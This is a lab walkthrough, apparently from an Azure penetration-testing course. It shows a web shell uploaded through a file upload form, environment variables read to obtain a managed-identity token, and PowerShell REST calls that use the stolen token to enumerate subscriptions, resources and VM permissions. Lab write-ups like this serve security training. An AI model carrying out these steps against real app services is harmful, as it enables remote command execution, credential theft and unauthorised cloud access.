# Abusing Identity Endpoint

We can upload .phtml files using the file upload functionality. Use the studentxshell.phtml from the Tools directory on your student VM (which is a super simple web shell)

After uploading the web shell, access it and pass the 'env' command to check if a managed identity is assigned to the app service. Look for environment variables IDENTITY\_HEADER and IDENTITY\_ENDPOINT in the output of https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env

<figure><img src="https://g37sys73m.gitbook.io/~gitbook/image?url=https%3A%2F%2F1846927083-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-Mj9GKP_mf1AnaApJEIA%252Fuploads%252FEJkXJLxHKT2wqmsGYFMF%252Fimage.png%3Falt%3Dmedia%26token%3Dd5858b72-a31f-4eb6-8959-dc79b78b73e4&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=8781f8a1&#x26;sv=2" alt=""><figcaption></figcaption></figure>

We can use a simple curl command to get the access token using the IDENTITY\_ENDPOINT AND IDENTITY\_HEADER. Let's upload another webshell studentxtoken.phtml for that. Access it by browsing to https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml:

<figure><img src="https://g37sys73m.gitbook.io/~gitbook/image?url=https%3A%2F%2F1846927083-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-Mj9GKP_mf1AnaApJEIA%252Fuploads%252Fy9coyD81q3uXhbq508QL%252Fimage.png%3Falt%3Dmedia%26token%3Db1ac9f9d-3ff8-4be7-acac-0a8b5883a497&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=d187868c&#x26;sv=2" alt=""><figcaption></figcaption></figure>

We can use the access token and client ID from above with Az PowerShell. But Az PowerShell’s Get-AzRoleAssignment would not show us the permissions for the current token. It would show role assignments only to ObjectIDs (no way to get the ObjectID of the Manged Identity token that we have).

<figure><img src="https://g37sys73m.gitbook.io/~gitbook/image?url=https%3A%2F%2F1846927083-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-Mj9GKP_mf1AnaApJEIA%252Fuploads%252FGwwgkXFIsvNsx4cxwPow%252Fimage.png%3Falt%3Dmedia%26token%3Dc94a7332-0cd4-4c96-af43-b4042f57d4ad&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=ad89f9dc&#x26;sv=2" alt=""><figcaption></figcaption></figure>

To resolve Object IDs to SignInName, we could request MS Graph tokens. While we can request both the tokes, for now, let's fall back to manual API calls for enumeration. Let's use the token with Azure REST API. We would need the subscription ID, use the code below to request it:

```powershell
$Token =  'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value 
```

List all resources accessible for the managed identity assigned to the app service. Note that the only difference is the URI

```powershell
$Token =  'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value 
```

Let's see what actions are allowed using the below code:

```powershell
$Token =  'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value
```
